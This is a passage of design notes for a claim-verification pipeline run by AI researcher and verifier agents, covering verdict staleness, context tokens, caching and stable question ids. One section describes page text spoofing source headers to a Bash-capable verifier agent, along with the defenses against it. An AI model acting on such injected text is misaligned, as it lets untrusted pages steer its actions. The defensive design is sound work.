#74 it is stale on the answer's side anyway, and this rule no longer spares a run a re-judge.
See the next section for why that side has no bound.) A **query citation** has no page at all,
and its result is re-run at every build; a changed query *definition* is query versioning's
(below).

**Stamp the copy the verifier read, not whatever is cached when `vg judge` runs.** Two bugs of
one shape. The cache is shared, so another run can re-fetch a page between `vg verify` and
`vg judge`: the verdict was stamped from the new copy, read fresh against it, and after the
next verify rendered `verified, supports` on text no verifier saw. And an archive-verified
context comes from the Wayback snapshot, but the stamp and the check both looked up the cited
URL — the paywall stub, which never changes — so a verdict about snapshot A rode through every
re-archive onto snapshot B. One mechanism covers both:
- `vg verify` records the copy it built each context from (`Verification.context_page`: URL,
  fetch time, extractor version), which is the snapshot for a `verified_via_archive` row.
- `vg judge` stamps that copy (`Judgment.page_url` beside the time and version) and refuses
  when the cache no longer holds it, or when it is not where the context comes from now. The
  copy comes from a claim file loaded trusted, which is safe only because it can refuse and
  never grant: the stamp is read off the cached page, and the check below compares its URL.
- `is_stale()` compares a verdict with the page it names, and reads it stale when the context
  now comes from another page (`Source.context_url`, also the page revalidation rebuilds the
  context from: one rule, not two copies that can drift). That is decided from the run's
  archive records, never from the claim file's `context_page`, so the records go on before any
  verdict is checked. For build and status that is `cli._settle()`, which now owns the whole
  order (snapshots, then verdicts, then revalidation, corroboration and inputs). `vg judgments`
  and `vg judge` apply them to archive rows themselves. One that forgets reads archive
  verdicts stale, not fresh. `vg judgments` never applied them at all, and counted every
  archive row as blocked whatever had been judged. `vg verify`'s own early `apply_to()` runs on
  stripped claims before anything is fetched, so it reads archive verdicts stale too; nothing
  it decides depends on that, and its write-back never carries a verdict.
- **Every `vg archive` makes archive-row verdicts stale**, by design: it saves a fresh
  snapshot, and a fresh snapshot is a different copy. It runs after the judgment pass, so it
  says how many verdicts it left stale, and the skill says to run `vg judgments` again after
  it. Without that, every paywalled row reaches the review app unreviewed.

One-time costs of the change, each failing toward re-checking. A claim verified before
`context_page` existed has to go through `vg verify` again before `vg judge` accepts a verdict
on it. A verdict on an archive row recorded before `page_url` existed was stamped from the stub,
so it reads stale and needs judging again, and so does any verdict stamped from the cited page
on a row now at `could_not_verify_paywall`: nothing shows whether it was about a snapshot the
row has lost. It is not re-judgeable as it stands, so its reason says the row needs a context
back from `vg archive` or `vg verify` first. `page_url` is written only when it names a snapshot
(`_WRITTEN_WHEN_SET`, as for the query-citation fields), so a shard of cited-page verdicts
reads, and checks correctly, in a checkout from before this change. One snapshot verdict makes that
checkout refuse its whole shard, and so every command that loads it — rather than check the
verdict against the stub.

**Tie a verdict to the context it was handed.** The copy check reads the claim file as it is when
`vg judge` runs, so it cannot see what a verifier read earlier. Say a verifier is handed context
C1, another run re-fetches the page, and a re-verify rebuilds the context as C2 from the new
copy. The claim file then names a copy that is cached, the check passes, and the verdict about
C1 renders green on C2. Every fact on disk was consistent; the one that was wrong, which
context the verifier read, was on no disk. So the verifier says it:
- `vg handoff <qid>` prints the claim and each source's context with a context token
  (`judgments.context_token()`), from one read of the claim file `vg judge` checks. The token
  is a short hash of the hand-off as a whole (next paragraph). The verifier runs the command
  itself, so no transcription sits between what it reads and the token it hands back.
- Everything it prints is agent- or page-authored, so it cannot be allowed to start a line.
  Every context line prints behind `| `, split with `splitlines()` (a `\r`, `\x85` or U+2028
  is a line break to some reader). Every control, format, surrogate or separator character
  prints as an escape (`cli._printable()`). Split on `\n` alone, an ANSI erase-line or a U+2028
  in page text faked a source header, and a lone surrogate in a claim made the print raise, so
  no verdict could be recorded on it at all.
- What the pipeline itself prints there is facts, never a step to take. The verifier has Bash
  and acts on what the hand-off says. The query-run line first reused `describe_export()`,
  whose undated-database wording tells an operator to run `vg calaccess build`. That rebuild
  moves every query run in the pipeline, so every token outstanding on a query citation stops
  matching.
- `vg judge --context <token>` is required for every verdict. A query citation once needed
  none, on the grounds that `unjudgeable_query()` already ties it to its run. It does, but only
  to the run on disk when judge runs: a re-verify under a bumped definition rewrote that run,
  the check then agreed with the registry, and a verdict about the old calculation was stamped
  as current. The token is checked last, so a wrong verdict, id, sid or copy is still what a
  refusal names first.
- A mismatch writes nothing and prints the `vg handoff` command to re-read, with the run's
  `--data` and `--cache` (without them it reads the default run, whose `q1` is another claim).
  It never prints the current token (see "Agent-supplied input can refuse, never grant" above).

**The token covers the hand-off as a whole, never a field list.** It used to hash a list of
fields kept beside the hand-off's print statements, and four fixes each found a printed field
the list lacked:
- the claim and the citation: a retry that rewrote only the answer, or only a filing's date,
  kept the sid and the context, and `superseded` turns on that date;
- a query citation's run (#86);
- the claim type (#91), which sets what the verifier is asked;
- the claim's other sources (#98). An adversarial claim's verifier judges them together, so a
  retry that swapped one for a reprint of the other, under another name on another host, carried
  an independence verdict onto a pair no verifier saw.

So `cli._handed()` builds what the hand-off prints as one value (`judgments.Handoff`),
`cli._print_handoff()` reads nothing else, and the token hashes all of it but what
`judgments._NOT_HASHED` names: the question id and the judged source's sid, which `vg judge`
takes as arguments and checks itself, and each source's status and the reason it has nothing to
judge. The other sources' sids are hashed, since a query citation's sid covers the figure it
asserts and nothing else printed does.
Whether it has a context is hashed, as the context; the reason also names the cache root as
spelled, so hashing it would split one database into two. Every source's block is in every
token, along with which block the token was printed beside. Any change to one source refuses
the outstanding verdicts on all of them, and a token handed back under another source's sid is
refused. `test_every_field_the_hand_off_prints_moves_the_token` walks the value's fields
rather than listing them: a field added to the hand-off is in the token and in the test
without anyone adding it, and leaving one out means naming it in `_NOT_HASHED`, in a diff a
reviewer reads.

The value is serialized as canonical JSON (sorted keys, every string quoted and escaped, every
list bracketed), never as joined text. The fields were joined with NUL, which json.loads keeps
inside a string, so text moved across the separator from one field into the next left the
token as it was (#99). Changing what the token covers changes every outstanding token once: a
verifier holding one is refused and re-reads the hand-off, and nothing else is lost.

The token guards the window from hand-off to judge, and no longer. A recorded verdict is keyed
by its sid, so one recorded beside a sibling that a later retry swaps out still applies: a
verdict about a set of sources is #42.

Handing out a token is a prediction that `vg judge` will record the verdict and `vg build` will
keep it, so `vg handoff`, `vg judge` and `vg judgments` ask one function, `cli._unjudgeable()`.
It includes build's own rebuild, run on a copy (`_rebuild_problem()`): a claim file whose
context is not what its cached copy gives (a hand edit, or a change to how contexts are cut)
passed the copy check, and build dropped its verdict only until the next `vg verify` rewrote
the file; after that the verdict applied to a context nobody had read. That source is now
refused by judge, gets no token, and counts as blocked on `vg verify`, not as waiting.

For a page, only the text is hashed, not the copy. Two copies of a page that give the same
context get the same token, which is right: the verdict is about those words, and the copy the
stamp names is the one cached now, which gives them. For a query citation the run is hashed
too, and that is not a contradiction: its verdict is about the calculation, not only the words
it printed. A re-run under a new definition, export or cache root that returns the same value
and note prints a context identical to the old one, so a token over the text alone could not
tell the two runs apart. Hash what the verdict is about, which is not always what the verifier
reads. The root is hashed resolved, as the run check compares it, and printed that way: hashed
as spelled, a re-verify naming the same database by an absolute path instead of a relative one
changed the token and sent the verifier to re-judge identical text. And `vg judge` stamps the run it checked, not a
second read of the registry and database, which a rebuild between the two could move. A query
context with no recorded run gets no token at all, since nothing says which calculation printed
it.

`vg judgments` asks the same question `vg judge` does before counting a source as waiting
(`judgments.unjudgeable_page()`, the page counterpart of `unjudgeable_query()`): a source
verified before `context_page` existed, or whose copy was re-fetched since, is blocked on `vg
verify`, not waiting on a verifier. Counted as waiting, the gate could never reach 0 by judging.
It asks with the claim file's `context_page` as loaded, before revalidation rebuilds it from
the page cached now, since that file is what `vg judge` reads.

## A verdict is about the answer it judged, too

A verdict says whether a page supports one claim's answer, and the sid covers only the page's
half (url + snippet). A retry that rewrote the answer and kept the source kept the verdict. A
`supports` recorded about "voted for" rendered green on "voted against". A `contradicts` held
a corrected claim in `human_review`, its note describing an answer the claim no longer gives.
No check caught either: same words, same page, same sid.

So `verdicts_for()` compares each verdict's `claim_fingerprint` (the hash of the question and
answer `vg judge` stamps; why that identity is under #30 above) with the claim's
`Claim.fingerprint`. One that differs is stale,
exactly like a verdict on a re-fetched page: not applied, reported by `vg verify`, `vg build`
and `vg judgments`, counted in the gate, and replaced by the next `vg judge`. That covers the
sources the claim still cites: there a stale `contradicts` reads `unreviewed` like any stale
verdict, so a corrected claim waits on a verdict about its new answer (`pending`), not on one
about the old answer. A `contradicts` on a source the claim no longer cites matches none of its
sources, so this rule never reaches it, whatever its fingerprint: whether it holds the claim is
#73's. The check sits in `verdicts_for()`, not `is_stale()`, because that is where the claim is
in hand, and everything that applies a verdict or counts it in the gate goes through it. The
same comparison catches a verdict filed under another claim's id: it judged that claim's
answer, whatever the sid says. Between twins (two claims that ask and answer the same thing) it
cannot tell, and needn't: a verdict on the same snippet judged the same words against the same
page.

**A legacy verdict, with no fingerprint, is stale.** The page rule above bounds a legacy verdict
by `judged_at` against the time every fetch stamps on its page. Nothing records when an answer
was written: `checked_at` moves on every `vg verify`, which re-checks every claim, and a claim
file's mtime moves on every write-back and checkout. With no bound, the query rule applies:
unknown fails toward re-checking. **One-time cost:** every verdict recorded before #30 is judged
again once, and `vg judge` records over it. Rejected: grandfathering them, which keeps the false
green open for every verdict already on disk, against retries made after this change too; and
backfilling the current fingerprint, which certifies whatever the answer says now.

**Where it stops: the stamp is the claim `vg judge` reads, not the one the verifier read.** If
the claim changes between hand-off and `vg judge`, a verdict about the old answer is stamped
with the new one and reads fresh. `vg judge` refuses a fresh retry file until `vg verify` has
run on it, but not one verified since, and not an answer edited in place, which keeps the
file's verification. #36's context token closes it: the token hashes the question and answer
with the context, and `vg judge` refuses one handed back for anything else. Until both have
landed, don't retry a claim while its judgment pass is running.

## Cache is authoritative — so version the extractor

A fetch-layer fix does not reach pages already cached, and nothing else signals that a cached
page predates it. Roll-call pages cached before the full-DOM fallback held only a name roster,
so citations to them could not identify their own bill and were rejected as `topic_only` —
which reads as a research failure rather than a stale cache, and cost a research session real
effort chasing it.

`EXTRACTOR_VERSION` fixes the class: bump it whenever extraction changes what a page yields,
and `fetch()` re-fetches anything cached under an older version automatically.

**A failed re-fetch never replaces a good page.** A bump re-fetches everything, including
hosts that now block us (cal-access, paywalled outlets); writing their exception, 403 or 500
over the cached page would send every citation of it to `fetch_failed` — a fix destroying
the pages it meant to improve. The good copy is kept and served as-is under its older
version; the failure is recorded on the page (`refetch_failure`), so it is retried only on
`--refresh` or the next bump, not on every run. It is reported where each reader looks: a
warning per run naming the URL and the failure; `vg fetch` and `vg check`; and, first in
the reason, every row `vg verify` checks against that page, plus every usable row `vg build`
re-derives — the review app and the retry loop never see a log. "Failed" means an
exception, a non-2xx/3xx or no text, never the paywall heuristic: that flags any short titled
page, and extractor fixes shorten pages. Verdicts are checked against the page's own
extractor version for the same reason: the kept text is the text they judged.

## Cache is authoritative

The verifier and the review app read the same cached page text. Never re-fetch at render
time: recorded match offsets would drift out from under the highlight, and "verified" would
stop meaning anything.

## localStorage and file://

The review app must be served (`vg serve`), not opened as a file. Several browsers disable
`localStorage` on `file://` origins and the checkbox state vanishes with no error.

## A refused build leaves nothing to serve

`vg build` renders nothing when it can't read what it would check or render: an unreadable
question set, claim, verdict or archive file, among others. That wrote nothing, so the previous
build's `out/review.html` and `out/claims.json` stayed. `vg serve` checks only that
`review.html` exists, so it served that render without a word, and a reviewer went on ticking a
page the pipeline had just refused to produce. That render predates whatever the build refused
on, so it can hold a claim filed under an id that now asks another question: what the stable-id
gate exists to keep out of review.

So `vg build` removes the last render first, before any step that can stop it
(`report.clear_render()`). Whatever stops the build then leaves no review app: a refusal, a
crash, or a kill (a closed terminal or a tool's timeout included, which run no exit handler).
`vg serve` refuses, naming a refused build as a cause, and a page reloaded from a running
`vg serve` gets a 404. It gets one while any build runs, too, until that build writes the new
render. Nothing is lost. The render is regenerable, and review progress lives in the browser's
`localStorage`, keyed by the title, so it comes back with the next build that succeeds. Only the
files a build writes are removed, along with any temp file a killed build left (`vg serve`
lists `out/`, dotfiles included, and one can hold a whole page); anything else in `out/` stays.
If they can't be removed, the build says so and stops, and they stay until someone removes them
by hand. Two builds of one run at once are not supported: both write the same `out/`, so the
last to finish decides what is there, and one can remove the other's temp file mid-write.

`render()` writes `claims.json` first and `review.html` last, each whole: a temp file named for
the process, fsynced, then renamed into place (`report._write_whole()`, the shape of
`judgments._write()`). A `review.html` in `out/` therefore always means a build finished
writing it, never half a page or an earlier build's.

Removing first, rather than on each exit, is the point. A refusal added later is covered
without anyone remembering this, and so is an exit no handler runs on. **An output a failed run
does not overwrite outlives the failure, and reads as that run's result.**

Still open: a tab that already has the page open keeps it until it is reloaded, and nothing
tells the reviewer it is stale (#122).

## A reviewer's check is per claim, and about what it was shown

The review app used to key its "verified by me" check by source id. A source id covers the
url and snippet, so two questions citing one snippet shared a check: ticking it under one
marked it under the other, and could mark that claim done, though nobody had read the source
against it. That is the pooling the verdict layer refuses ("A verdict is per question, not per
source"), one layer later, at the layer meant to be last.

So a check is recorded by what it attests, `report.review_fingerprint()`: the claim, the
citation as the researcher asserted it and the row shows it (source id, publisher, author,
date, page, secondary-host ack), and the evidence (the excerpt's text and highlight; where there
is no excerpt, the snapshot offered instead; for a query row, the definition and export it was
checked against). A row reads checked while its fingerprint is recorded. Another question citing
the source has another fingerprint, and a re-fetch, new snapshot, moved highlight or reworded
claim gives this row a new one, so it reads unchecked and says why. Two rules came out of
getting there:
- **Hash what was attested, not where it was shown.** The first cut keyed checks by row
  (`<question id>/<source id>`), so a claim moved to another question id lost every check and
  flag on it. The row key now only says which row a check was made on, so the "changed since"
  warning lands on the right row. It is unique per row (a second citation of one source in one
  claim gets `/2`), and the page's `render()` re-points a check to the row showing it now,
  since a check that followed a moved claim still named the old row.
- **Hash identity, not display.** The printed query command carries the `--cache` path, the
  query's context carries its note (a message), and the excerpt's markup is ours. Hashing any of
  them cleared every check when the build was invoked differently or a message was reworded,
  and that teaches reviewers to re-tick without reading. Pipeline verdicts (status, support)
  are left out for the same reason: they don't change what the reviewer read. The fields are
  hashed as JSON, not joined: they are agent-authored, so any separator can occur in one.

A new snapshot does clear a check on a row with no excerpt, by the same rule the verdict layer
uses: a fresh snapshot is a different copy.

Flags and notes stay per source, shown wherever the source is cited. They are warnings, not
attestations: shared, one fails toward a second look, while keyed per row they vanished when a
claim moved.

Progress saved per source is migrated, not reinterpreted. Its ticks are dropped, because they
name no claim and no excerpt, and a notice says how many until the reviewer dismisses it (shown
once, a reload hid it for good). The new progress lives under a new storage key, and the old
one is only read, and only when the new one is absent. A new store the page can't read is
kept aside and reported: one that doesn't parse, and one that parses to anything but this
version's progress (a later version's, a hand edit). Migrating again would bring back flags
cleared since, and reading it as empty is a delete, since the first save writes over it. An
imported file is held to the same rule and refused.
When you change what a stored key means, decide what each old key means under the new rule.
Otherwise the whitelist discards them silently, or a loose lookup matches them to every row.

The tests run the page's own script under node (`tests/review_app_harness.js`) against a
minimal DOM that supports single-class selectors only and throws on anything else, so a
template change that needs more fails loudly: extend the harness, don't stub around it. They
skip without node only outside CI, and the fingerprint tests, which need no node, never skip.

## Race-specific content lives in races/

Nothing about a candidate, an office, or a state belongs in `src/`, the skill, or the agent
definitions. A race is one file in `races/` naming its source lists; the source lists are
`sources/<region>-sources.yaml` and merge. If you find yourself adding a candidate name to
the pipeline, put it in the race file instead.

Tests see only the synthetic race in `tests/fixtures/races/`, through conftest's autouse
`example_race`, which patches `races.RACES_DIR` with the test's own `monkeypatch`. So
`monkeypatch.undo()` partway through a test undoes that too, and the next `vg` command fails
to load a race, with a bare exit 1 under `CliRunner`. Scope a temporary patch with
`with monkeypatch.context() as m:` instead.

## Researchers search; they are never told what they will find

Two rules, same reason:

**Questions ask what the record shows.** "What documented allegations of misconduct exist?"
is research; "confirm the Doe settlement" is transcription. A researcher handed the
answer finds that answer and stops — so a second incident, a bigger donor, a more recent
filing never surfaces, and the corroboration you get back is the pipeline agreeing with
itself.

**Race context is thin on purpose.** `race.context` goes verbatim into every researcher
prompt, and it is unverified by construction — no snippet, no source, `vg verify` never
looks at it. So a factual claim placed there is believed by every researcher and checked by
none. Context earns its place by helping *find records* (which bodies keep minutes on this
office, which LegInfo host covers which years); anything else is a question with a citation.
Known claims live under `# Completeness check`, which `races.load()` splits out of
`context` — check it *after* results are in, and treat a gap as a finding rather than
topping up a claim with the answer.

## One run per candidate; one cache for all of them

Each candidate is a separate run under `data/<candidate-id>/` — own claims, own retries,
own review progress. `vg new-candidate <id>` scaffolds it and retargets the question set to
that person's name, so a researcher is never left inferring who "the candidate" means.

The page cache is deliberately **not** per-candidate. The same filing, article, or roll call
routinely covers more than one of them, and re-fetching per run would both waste time and
risk handing two runs different bytes for the same URL.

Two things that must stay per-candidate: the review app's storage key (it is derived from
the title, which is why `vg build --candidate <id>` names the person — two candidates
sharing a key would show each other's checkmarks), and the race file's completeness check.

One consequence of separate runs worth keeping in mind: `conflicts.py` compares dollar
figures across every claim it is given. That is right within a candidate and wrong across
two, so if these datasets are ever merged, scope the cross-claim comparison by subject
first.

**Gotcha: a rule keyed on "does a cache exist here?" fulfils itself.** `_cache_root()` used
to let a run's own `cache/` win if present. The first stray write into `data/<candidate>/cache`
created exactly that condition, so the stray *became* the cache: one fetch with
`--data data/<candidate>` forked the pages and hid the CAL-ACCESS database, and every query
citation in the run failed at once. A candidate dir now uses its parent's cache whenever the parent is a
data root (it has the race's `questions.json` template, written before any candidate exists),
stray or not, and names the stray in a yellow warning; `--cache` still overrides. The parent's
own `cache/` is deliberately NOT part of the test: it is gitignored, so on a fresh clone it
does not exist yet and the first run would fork. Don't let the existence of an output
directory decide where outputs go: whatever first creates it gets to pick. Every command that
touches the cache — `vg calaccess` included — must resolve its root through `_cache_root()`
and take `--cache`, or two commands disagree about where the database lives. That includes reads: the verdict
staleness check used to look under the candidate dir and, through `cache_dir()`'s mkdir,
recreate the stray on every run (see "A verdict is about a source as cached at judgment time").

## Question ids are stable and never reused

A question id names one question for the life of a run. **A split or reworded question gets a
new id, and the old id is retired**: never given to another question. Retiring it is done by
hand, in three parts:
- move its claim file out of `claims/`, to `claims-archive/`;
- move its verdict shard out of `judgments/`, to `judgments-archive/`;
- point any `derives_from` that names the old id at the new one.

Nothing in the pipeline moves a claim between ids. A dependent still naming a retired id goes to
`human_review` with the input missing.

**`vg build` and `vg status` are the rule's gate** (`questions.check()`, run by
`cli._question_ids()`). Each compares every claim with the question the run's `questions.json`
holds for its id. Two breaks fail it:
- a claim on an id the set does not list: a retired id whose claim was left in `claims/`, which
  would otherwise render beside its replacement;
- a claim whose `question` is not the text at its id: a reworded or reused id, or a claim that
  misquotes its question. On disk the two look alike, so both fail, and the message gives the
  fix for each.

A failing claim is left out of the review app and the status table, and the command exits 1,
naming it last. The rest still render, as `load_claims()` skips an unreadable claim: one
mis-filed claim must not cost the run every other one. A claim deriving from one left out reads
its input as missing and goes to `human_review`. Before the gate, `vg build` never read
`questions.json`, and every command exited 0 on both breaks.

"The text at its id" is compared the way a snippet's normalized match is, through
`normalize()`: whitespace, curly quotes and dashes, Unicode composition and case are folded,
since copy-paste drifts on them and they print almost or wholly alike. A failure nobody can
see is one nobody can fix. `normalize()` folds one character at a time, so the texts are
composed (NFC) first, or an "e" and a combining accent never meet the "é" they print as.

A `maps_from` still declared in the set is reported without failing: nothing applies it now, so
no claim moves, and each is checked against the question at the id it sits on. Settle it and
delete the key. An identity pair moved nothing, so it is not reported.

`vg check-claim` runs the same comparison on the one claim a researcher is handing on, so a
misquoted question fails there, before build leaves it out of review. It checks against the set
of the run the claim sits in, the directory holding its `claims/` (resolved, so a relative
path from inside `claims/` works), not `--data`. A researcher on a candidate run checks with the
default `--data data`, whose set is the root template, not the copy retargeted to the candidate.

Which `questions.json` is the run's is #8. Until a run declares it, the gate reads the run's own
(`data/<candidate>/questions.json`, which `vg new-candidate` writes), else the data root's. A
candidate run's own copy is not updated when the template gains a question, so add a new one to
each run's copy as well. A set that can't be read as one question per id fails the whole
command, and build renders nothing, since no claim could be checked. The message names every
problem: not a list, an entry with no id or text, an id no claim can carry (`QID_PATTERN`), or
one id given twice. Ids differing only in case are one id, since they are one claim file and
one shard on macOS's default disk. Read as empty, the set would report every claim as retired.
Read as missing, it would check nothing, and so would falling back to the root's when the run's
own can't be read (a dangling symlink included). With no set at all, the gate says so and checks
nothing.

What the gate can't see is a reused id once the new question's research has replaced the old
claim. The claim then matches the set, and the shard's old verdicts sit beside it wherever it
cites the same source. They used to render green on a claim no verifier judged, because a
verdict applied by its source alone. Each is now compared with the claim through its stamp
(#30): it judged another question, so it is stale and not applied, and the claim waits on a
verdict about the new one (see "A verdict is about the answer it judged, too"). That costs a
judgment pass, and the gate catches the reuse itself only while the old claim is still in
`claims/`, so still move a reworded or replaced question to a new id before anyone researches it.

This rule replaced `vg remap`, which re-filed claims onto a renumbered question set (declared
as `maps_from` in `questions.json`) and re-homed their verdicts, and `vg judgments --repair`,
which re-homed verdicts after the fact. Both are retired: invoking either exits 1 and states
this rule. Question ids are also file names, and a verdict belongs to a claim only through the
shard it sits in, so every move was a chance to attach a real verdict to the wrong claim. remap
was the largest single source of defects in the codebase, and each one was a false green or
lost data: re-application, path traversal through a mapping entry, ids differing only in case,
a crash mid-move, sources shared across questions, stranded claims, dangling `derives_from`,
and a dropped `previous_question`. It was written for one migration, which had finished.
Hardening it further cost more than it could ever save, and stable ids remove the need.

What is left:
- `maps_from` and `mapped_from` in a `questions.json`, and `previous_question` in a claim file,
  still load; nothing writes them, and the gate reports a `maps_from` (above). `vg new-candidate`
  copies neither of the first two: they are another run's history, and a new run has no earlier
  id space. `Claim` has no
  `previous_question` field, so it is ignored on load and the next `vg verify` write-back drops
  it, as it always has (#85, closed with remap, since nothing writes it now).
- A `judgments-backup/` that an interrupted re-home left behind still stops every command that
  reads verdicts, `vg remap` included, because the shards may be half-rewritten. The message
  says how to undo it: run `vg judgments --rollback` from a checkout of
  `judgments.LAST_WITH_ROLLBACK`, with the run's absolute path, since a relative `--data` there
  names that checkout's own data/. The rollback leaves the migration pending, so then re-run the
  interrupted command from that same checkout to finish it.
  `judgments-backup.partial/` and `judgments-backup.discard/` are different: one was still being
  built and had touched no shard, and the other was already retired after its re-home finished.
  Nothing reads them, and nothing clears them now, so `vg judgments` names them
  (`judgments.leftovers()`). Delete them; never restore from them.
- A run's `.remap-applied` marker is read by nothing now. The old instructions said to commit it
  beside the run's claims, so a tracked one can outlive the command, and `.gitignore` covers only
  the data root's: delete it in the run's next commit.
- Question-id validation was never remap's and stays: the id pattern (`models.QID_PATTERN`,
  checked again in `judgments.path_for()`), and `vg judgments` counting a shard the disk opens
  under a claim's id as that claim's (`judgments.opened_as()`).

Lessons from it that still apply:
- **Don't keep hardening a tool for a finished one-off job. Remove the need for it.**
- **A description of a change must not outlive the change.** `maps_from` said where claims lived
  *before* a migration, and it read exactly the same after the migration ran, so a second apply
  moved every claim again. Anything that describes a change rather than a state has to be retired
  when the change is applied.
- **When old and new ids overlap, files on disk can disprove that a move happened, never prove
  it.** A finished permutation and an unstarted one look alike.
- **If anything rewrites several files as one change again**, keep a backup that is complete or
  absent at every instant. Build it beside its final name, fsync it, and rename it into place.
  Retire it by renaming it to a name nothing reads, then delete it. `rmtree` is not atomic, and
  a half-deleted backup read as the truth drops everything it lacks. Make recovery a command,
  not a procedure: the hand-written one told operators to remove the shards the backup lacked.
- **On a case-insensitive disk, remove before you write.** On macOS's default volume, `q1.json`
  *is* `Q1.json`, and `os.replace(tmp, "q1.json")` over it keeps the name `Q1.json`. Writing the
  new name and then unlinking the old one deleted what had just been written. For the same
  reason, names inside one directory must differ in more than case. A question id is a file
  name in `claims/` and `judgments/`, so it is unique only if it is unique casefolded.
  `questions.load()` refuses a set holding two such ids, and `load_claims()` refuses two claims
  holding them, naming both files. `load_claims()` used to compare ids exactly, so claims `Q1`
  and `q1` both loaded and shared one shard on a Mac. It refuses on every disk, not only where
  the disk folds case: a run is shared through the repo, and a pair a case-sensitive checkout
  holds breaks on the first Mac to clone it. CI's disk is case-sensitive, so the
  case-insensitive path never runs there: pin it with a test that patches the disk's answer
  (`judgments._same_file()`), as
  `test_vg_judgments_counts_a_shard_a_case_folding_disk_opens_as_the_claims` does. When a change
  touches names, run the suite on both kinds of disk: a Mac's default volume, and
  `pytest --basetemp=<dir>` on a case-sensitive one. A case-sensitive APFS disk image
  (`hdiutil create -fs "Case-sensitive APFS"`) gives a Mac one. If a test there fails on a
  phrase its output split across two lines, rerun with `COLUMNS=400`: tests that call a command
  directly read rich's output at 80 columns, so where a line wraps depends on how long the tmp
  path is (#63).

## A real citation to the wrong document passes every check

Form 700s and campaign finance forms are **series**. A 2024 filing verifies exactly as well
as the 2025 one sitting next to it in the same search results: same host, same institutional
author, snippet genuinely present, unique, ⌘F-able. Verification asks whether a snippet is
on a page. It cannot ask whether that page is the current filing, and no amount of
tightening the matcher will change that — the mechanical layer is the wrong place for the
question.

Observed in testing, and instructive: the retry didn't help either, because the retry loop
was feeding back only mechanical failures. The researcher heard "snippet not found", fixed
the *quote*, and kept the stale document.

So the question is split three ways:
- `researcher.md` — open the filer's index, take the newest, put the period in the answer.
- `missing_filing_date()` — the one mechanical grip available: a citation on a filing host
  must carry its own date, or nobody downstream can even ask the recency question.
- `verifier.md` — `superseded` is a verdict. Checking the index for a newer filing is
  judgment, which is what that agent is for.

The general shape: when a defect is invisible to the mechanical layer, don't stretch the
mechanical layer. Give it to the judgment layer and make the precondition checkable.

## Unreachable source → silent substitution. Make the substitution loud.

The general failure: a researcher cannot reach the authoritative record, quietly cites
something else, and every downstream check passes because the substitute is a real document
with the quote really in it. Observed here with an annual financial-disclosure filing: the
issuing agency's portal is a JS app, so a researcher cited a copy hosted by another public
agency — right document, wrong year, perfect verification.

`secondary_host()` catches the class, not the instance: a `primary_document` or
`official_record` cited from a host that is not the issuing authority. Citing a copy is
allowed — often it is the only reachable version — but it must carry `secondary_host_ack`
saying what could not be reached and why this copy is the same document. `vg check-claim`
fails without it, and the review app badges the row "copy, not the issuing authority".
The rule is not "never cite a copy", it is **never substitute silently**.

The other half is fixing the reachability where possible, rather than only detecting the
symptom — and then *recording* it, so the finding outlives the session that made it.

`sources/access/<host>.yaml` is that record: what a naive fetch gets, any endpoint that
works, and the known limits. `vg source-access [host]` reads it, `--run-recipe` executes one,
and `vg source-import-curl` turns a browser "copy as cURL" into an entry. Negative results
belong here too — "probed, needs a session, retrieve by hand" stops the next run from
re-litigating it and from substituting silently.

**Credentials never enter the registry.** The importer drops session headers and `run()`
refuses a recipe carrying them, because an endpoint that only works with someone's session is
a manual retrieval, not a pipeline capability — recording it as one would be both a leak and a
lie about what the pipeline can do unattended.

The importer let credentials through in two ways. Both were fixed by failing closed, not by
listing more names:
- **A parser that skips what it doesn't know has to know how much to skip.** The importer
  skipped a curl option it didn't know without skipping that option's value. So
  `curl --user name:password URL` recorded `name:password` as the recipe's URL, and as the
  name of the registry file. `parse_curl()` now knows the arity of every option it accepts and
  refuses any other option. It also refuses `--user` and curl's other credential options, a
  login in the URL, and a second URL, which is the shape a misread value takes. No refusal
  repeats the value, and that includes a `-H` with no colon: it is all value.
- **A deny-list of names can't anticipate what a site calls its session.** Only `Cookie`,
  `Authorization` and a few more were dropped, so `x-csrf-token` and `x-xsrf-token` reached
  disk. Credential headers now match by pattern (`credential_header()`), and `run()` uses the
  same test. On import that is only the first check: a header is kept only if it is in
  `SAFE_HEADERS`, and every other header is dropped and named. A human can add a header the
  endpoint needs back by hand, and `run()` still refuses it if it looks like a credential. A
  safe name can still carry a session in its value. `referer` is the full URL of the page, so
  it is kept only as far as the page, without its query or `;jsessionid=` parameters, and an
  `origin` or `referer` holding a login is refused, on import and by `run()`.

A credential can also ride in the recipe URL's parameters or in the body, and those are
**refused, not dropped** (#52). A header describes who is asking, so a recipe without one still
asks the same question. A parameter is part of the question. Drop one the rule misreads, such
as a search's `key=LastName`, and the recipe still runs and returns plausible results for a
broader search: the silent substitution this registry exists to prevent. So the import stops
and names each parameter (never its value), and a human removes it from the paste or records
the endpoint by hand. `run()` runs the same check after filling, since a param can hold a whole
`name=value` pair. Every channel is read, in one function (`_credential_params()`) that both
callers use:
- the query, the fragment, and each path segment's `;` parameters;
- the URL in an `origin` or `referer` header. The import already strips the referer's query,
  but a hand-edited recipe can put one back;
- a form body, and a JSON body's keys at any depth;
- inside any value, the keys of JSON, the parameters of a URL (a `next` or `callback` link
  carries a query of its own, relative or absolute), and `&`-joined pairs.

Pairs are read twice, split on `&` alone and on `&` and `;`, because servers differ: splitting
on `;` alone cut up a JSON value holding one, and the key after it went unread. **A reader that
reads text two ways must not redo the work both readings reach.** Each reading recursed into
the same nested value, and each returned its names, so a URL nested in a URL doubled the work
and the name list at every level. A 130-character paste ran for minutes. `_value_names()` is
now cached for the length of one check, and `_pair_names()` keeps each name once. A value is
read as pairs only if it holds an `&`. A lone `name=value` is too often base64 with its
padding, and `__VIEWSTATE` is kilobytes of it, whose letters sooner or later spell `Key`. A body
that is neither JSON nor form-encoded is refused, because its fields can't be read: a multipart
form carries its CSRF token in a part.

**Parameter names need their own rule, and a word counts only if it has no ordinary
public-records meaning.** The header pattern matches parts of words. In a parameter name those
parts mean other things:
- `?session=2025-2026` and `?sess=CUR` are legislative sessions;
- `auth` is in `author` and `authority`, and `pass` is in `passed`;
- `pin` is a parcel number, and `keys` is a site search box.

`credential_param()` splits a name into words (`apiKey`, `api_key` and `X-Api-Key` all hold
`key`) and matches three things: whole words, parts no ordinary word contains, and a few
two-word forms. The parts catch names with no separators to split on (`csrfmiddlewaretoken`,
`PHPSESSID`, `_wpnonce`). `key` is a whole word or ends a named compound (`apikey`, `sesskey`),
because a part match took `turkey` and `hockey` with it. The two-word forms are those compounds
split (`api_keys`) and `session` followed by `id`. Every word left out is left out on
purpose, and the review rounds on #52 proposed several of them:
